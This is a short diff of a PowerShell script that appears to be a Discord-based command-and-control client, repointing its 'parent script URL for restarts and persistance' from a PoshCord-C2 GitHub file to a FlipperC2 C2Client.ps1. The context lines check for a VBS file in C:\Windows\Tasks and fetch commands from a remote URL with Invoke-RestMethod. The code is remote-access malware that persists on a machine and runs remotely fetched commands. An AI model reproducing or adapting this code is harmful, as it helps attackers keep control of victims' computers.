@@ -78,7 +78,7 @@ if(Test-Path "C:\Windows\Tasks\service.vbs"){
 }
 
 $version = "1.7.0" # Current Version
-$parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
+$parent = "https://raw.githubusercontent.com/shahmanston3/FlipperC2/main/C2Client.ps1" # parent script URL (for restarts and persistance)
 $response = Invoke-RestMethod -Uri $GHurl
 $previouscmd = $response
 
